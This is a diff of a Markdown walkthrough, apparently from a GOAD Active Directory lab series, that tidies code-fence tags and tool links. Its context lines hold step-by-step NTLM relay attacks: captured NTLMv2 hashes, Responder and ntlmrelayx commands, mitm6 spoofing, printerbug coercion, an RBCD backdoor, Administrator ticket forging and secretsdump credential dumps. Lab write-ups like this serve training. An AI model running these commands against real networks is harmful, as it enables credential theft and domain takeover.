@@ -60,7 +60,7 @@ The bot `robb.stark` attempts to establish an SMB connection to 'bravos' instead
 
 ![screenshot_1.png](./images/screenshot_1.png)
 
-```c
+```
 [SMB] NTLMv2-SSP Client   : 10.4.10.11
 [SMB] NTLMv2-SSP Username : NORTH\robb.stark
 [SMB] NTLMv2-SSP Hash     : robb.stark::NORTH:01f4015df25f87e4:3BF36B5251AC8C43032472F019768D74:0101000000000000008915F17684DC0103414CD8D489E53E00000000020008004D004D0049005A0001001E00570049004E002D005100360054004B0038004C0031005100450037004F0004003400570049004E002D005100360054004B0038004C0031005100450037004F002E004D004D0049005A002E004C004F00430041004C00030014004D004D0049005A002E004C004F00430041004C00050014004D004D0049005A002E004C004F00430041004C0007000800008915F17684DC0106000400020000000800300030000000000000000000000000300000951F8CA0F672A06FD4CA0ACD3A4D36E8267DD567EA2DD61CC0C5DB0174E981450A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000
@@ -70,7 +70,7 @@ After a few more minutes (with the eddard bot running every 5 minutes and the ro
 
 ![screenshot_2.png](./images/screenshot_2.png)
 
-```c
+```
 [SMB] NTLMv2-SSP Client   : 10.4.10.11
 [SMB] NTLMv2-SSP Username : NORTH\eddard.stark
 [SMB] NTLMv2-SSP Hash     : eddard.stark::NORTH:5320d7cf139d156b:2901B41FC44CD6B0DCBD9FAD5DB13AF8:0101000000000000008915F17684DC011555C588B1CE317B00000000020008004D004D0049005A0001001E00570049004E002D005100360054004B0038004C0031005100450037004F0004003400570049004E002D005100360054004B0038004C0031005100450037004F002E004D004D0049005A002E004C004F00430041004C00030014004D004D0049005A002E004C004F00430041004C00050014004D004D0049005A002E004C004F00430041004C0007000800008915F17684DC0106000400020000000800300030000000000000000000000000300000951F8CA0F672A06FD4CA0ACD3A4D36E8267DD567EA2DD61CC0C5DB0174E981450A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000
@@ -128,7 +128,7 @@ To execute this, we edit the configuration file located at `/usr/share/responder
 **1. Locate the `[Responder Core]` section.**
 **2. Modify the `SMB` and `HTTP` servers to `Off`.**
 
-```plain text
+``` text
 ; Servers to start
 SQL = On
 SMB = Off     <-- CRITICAL CHANGE
@@ -192,7 +192,7 @@ Once we receive the notification that a connection has been relayed and a port t
 
 `sudo responder -I eth0 -dw -vvv`
 
-`[ntlmrelayx.py](http://ntlmrelayx.py/)`` -tf hosts.txt -smb2support -i`
+`ntlmrelayx.py -tf hosts.txt -smb2support -i`
 
 ![screenshot_7.png](./images/screenshot_7.png)
 
@@ -242,7 +242,7 @@ In our previous attacks, the tool grabbed the connection and either "consumed" i
 1. **Ready for Multi-Tooling:** The output "Enjoy" is an invitation to use tools like **proxychains**. We can now run `proxychains smbclient ...`, `proxychains netexec ...`, or `proxychains secretsdump.py ...` targeting either IP address. The traffic will hit local port 1080, be routed by `ntlmrelayx` into the appropriate authenticated session slot (3 or 4), and land on the target server as Robb Stark.
 **`NOTE:`**If ntlmrelayx sends back this error:
 
-```bash
+```
 Type help for list of commands
     self._target(*self._args, **self._kwargs)
   File "/usr/local/lib/python3.10/dist-packages/impacket/examples/ntlmrelayx/servers/socksserver.py", line 247, in webService
@@ -267,7 +267,7 @@ Edit the configuration file located at `/etc/proxychains4.conf`. We must verify 
 
 **Operational Note:** Comment out `strict_chain` and enable `quiet_mode` if you want to reduce screen clutter, but ensuring the `ProxyList` is correct is the mandatory step.
 
-```plain text
+``` text
 [ProxyList]
 # Ensure this point to the NTLM Relay SOCKS listener
 socks4 127.0.0.1 1080
@@ -283,7 +283,7 @@ When we target the SAM Database, our primary objective is the extraction of the 
 
 ![screenshot_11.png](./images/screenshot_11.png)
 
-```bash
+```
 [*] Service RemoteRegistry is in stopped state
 [*] Starting service RemoteRegistry
 [*] Target system bootKey: 0x5ee346d4358d7437b34ce472a0d560a9
@@ -423,7 +423,7 @@ With **mitm6** actively spoofing DNS and directing network traffic to our attack
 Our specific objective with this command is **Resource-Based Constrained Delegation (RBCD), **which will be a topic that we will discuss later on during **GOAD - part 10 - Delegations** . 
 Instead of just dumping data, we are attempting to manipulate the Active Directory structure itself to create a permanent backdoor.
 
-`[ntlmrelayx.py](http://ntlmrelayx.py/)`` -6 -wh 'wpadfakeserver.essos.local' -t 'ldaps://meereen.essos.local' --add-computer 'starkcomputer' --delegate-access`
+`ntlmrelayx.py -6 -wh 'wpadfakeserver.essos.local' -t 'ldaps://meereen.essos.local' --add-computer 'starkcomputer' --delegate-access`
 
 ![screenshot_14.png](./images/screenshot_14.png)
 
@@ -456,7 +456,7 @@ While modifying domain objects to create persistent backdoors (like in the RBCD 
 
 This operation effectively mirrors the capabilities of BloodHound or extensive manual LDAP reconnaissance, but with a critical advantage: it requires **zero credentials** beforehand. Because we are relaying the session of a machine account (like **BRAAVOS$**) or a user, we inherit their "Read" permissions on the entire directory tree. When the relay handshake with the Domain Controller succeeds (seen in the log as `Authenticating... SUCCEED`), the tool automatically executes a recursive query against the Global Catalog and Domain Partitions.
 
-`[ntlmrelayx.py](http://ntlmrelayx.py/)`` -6 -wh 'wpadfakeserver.essos.local' -t 'ldaps://meereen.essos.local' -l /tmp/loot`
+`ntlmrelayx.py -6 -wh 'wpadfakeserver.essos.local' -t 'ldaps://meereen.essos.local' -l /tmp/loot`
 
 ![screenshot_18.png](./images/screenshot_18.png)
 
@@ -486,13 +486,13 @@ To execute this, we utilize a coordinated strike between two tools:
 
 We must first establish our listener on the network. We configure `ntlmrelayx` to listen on the standard SMB port 445 . Our target is the **LDAPS** interface of the ESSOS Domain Controller (**Meereen**). We use LDAPS (port 636) instead of standard LDAP because modifying delegation attributes typically requires an encrypted channel. The critical argument here is `--remove-mic`, which activates the CVE-2019-1040 exploit logic to strip the protection flags in flight. We also instruct the tool to utilize our "Trojan Horse" computer account (`mrstark3$`) to set up the delegation backdoor on whatever machine we manage to coerce.
 
-`[ntlmrelayx.py](http://ntlmrelayx.py/)`` -t ldaps://meereen.essos.local -smb2support --remove-mic --add-computer 'mrstark3$' --delegate-access --escalate-user 'mrstark3$'`
+`ntlmrelayx.py -t ldaps://meereen.essos.local -smb2support --remove-mic --add-computer 'mrstark3$' --delegate-access --escalate-user 'mrstark3$'`
 
 ### Phase 2: Execution of Coercion (Coercer)
 
 In a separate terminal, we use our authenticated user session to poke the target. We utilize the python tool **Coercer** (a powerful successor to individual scripts like `printerbug.py` or `petitpotam.py`) which attempts multiple known RPC coercion methods automatically. We target **Castelblack**, instructing it to connect back to our Kali IP address (the listener).
 
-`python3 ``[printerbug.py](http://printerbug.py/)`` 'essos.local/khal.drago:horse'@'braavos.essos.local' 10.4.10.179`
+`python3 printerbug.py 'essos.local/khal.drago:horse'@'braavos.essos.local' 10.4.10.179`
 
 ![screenshot_21.png](./images/screenshot_21.png)
 
@@ -504,7 +504,7 @@ This completes the architectural compromise. We have not just stolen a credentia
 
 Now that the attack has succeeded, we can exploit the **`Braavos`** server with RBCD. Having successfully added a computer to the domain, we can now leverage this to request the Administrator Service Ticket.
 
-`[getST.py](http://getst.py/)`` -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 10.4.10.12 'ESSOS.LOCAL/mrstark3$:IZq5,#*}D4)HDq-'`
+`getST.py -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 10.4.10.12 'ESSOS.LOCAL/mrstark3$:IZq5,#*}D4)HDq-'`
 
 ![screenshot_22.png](./images/screenshot_22.png)
 
@@ -512,7 +512,7 @@ Now that the attack has succeeded, we can exploit the **`Braavos`** server with 
 
 ![screenshot_23.png](./images/screenshot_23.png)
 
-```powershell
+```
 #!/bin/bash
 # High-Level Interactive Kerberos Time Synchronization Script
 sudo systemctl stop systemd-timesyncd
@@ -561,11 +561,12 @@ This command explicitly requests a Service Ticket for the **CIFS** service on **
 With the retrieval of the **Administrator** service ticket in the form of a `.ccache` file, we have effectively completed the execution phase of the coercion attack chain. Our immediate next move is to operationalize this ticket by exporting the `KRB5CCNAME` environment variable, which tells our attack tools to utilize this specific credential cache for authentication. Once loaded, we can target the **Braavos** server directly using tools like `secretsdump.py` or `psexec.py`, forcing the remote system to acknowledge us as the local administrator without ever having provided a password or hash. This step validates that our manipulation of the delegation attributes successfully translated into tangible system access.
 
 `export KRB5CCNAME=Administrator.ccache
-``[secretsdump.py](http://secretsdump.py/)`` -k -no-pass 'ESSOS.LOCAL/administrator@braavos.essos.local'`
+
+`secretsdump.py -k -no-pass 'ESSOS.LOCAL/administrator@braavos.essos.local'`
 
 ![screenshot_24.png](./images/screenshot_24.png)
 
-```bash
+```
 Impacket v0.14.0.dev0+20260114.195536.1a876e02 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Service RemoteRegistry is in stopped state
